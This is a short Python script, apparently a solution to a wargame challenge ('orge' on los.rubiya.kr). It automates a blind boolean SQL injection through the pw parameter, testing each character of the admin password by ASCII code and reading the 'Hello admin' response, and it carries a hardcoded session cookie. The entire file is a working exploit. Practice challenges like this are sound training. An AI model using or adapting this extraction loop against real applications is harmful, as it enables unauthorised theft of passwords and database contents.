import requests
cookies = {'PHPSESSID': 's3pme5nhda93k7jt7khal1al5u'}
length = 8
for a in range(1, length+1):
    for b in range(48,123):
        URL = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw=%27%20||%20ascii(substr(pw," +str(a)+ ",1))=" +str(b)+"%20%23"
        res = requests.get(URL, cookies=cookies)

        if "<h2>Hello admin</h2>" in res.text:
            print(str(chr(b)))
            break

